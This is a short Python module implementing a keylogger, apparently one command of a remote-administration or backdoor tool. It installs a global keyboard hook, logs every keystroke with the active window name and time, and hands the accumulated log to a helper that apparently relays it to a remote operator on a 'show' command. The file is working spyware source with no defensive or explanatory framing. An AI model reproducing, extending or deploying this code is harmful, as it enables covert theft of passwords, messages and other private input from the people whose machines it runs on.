import requests
import time
from threading import Thread
import pythoncom
import pyHook

import utils


started = False
keylog = ""
current_window = ""


def OnKeyboardEvent(event):
    global current_window
    global keylog
    if current_window != event.WindowName:
        current_window = event.WindowName
        keylog += "\n\n[%s] @ %s\n" % (current_window, time.ctime())
    key = ""
    if event.Ascii == 27:
        key = '[ESC]'
    elif event.Ascii == 13:
        key = "\n"
    elif event.Ascii:
        key = chr(event.Ascii)
    keylog += key
    return True


def keylogger():
    hm=pyHook.HookManager()
    hm.KeyDown=OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()


def run(action):
    global started
    global keylog
    if action == "start":
        if not started:
            klg = Thread(target=keylogger)
            klg.setDaemon(True)
            klg.start()
            started = True
            utils.send_output("Keylogger started")
        else:
            utils.send_output("Keylogger already running")
    elif action == "show":
        utils.send_output(keylog)
    else:
        utils.send_output("Usage: keylogger start|show")
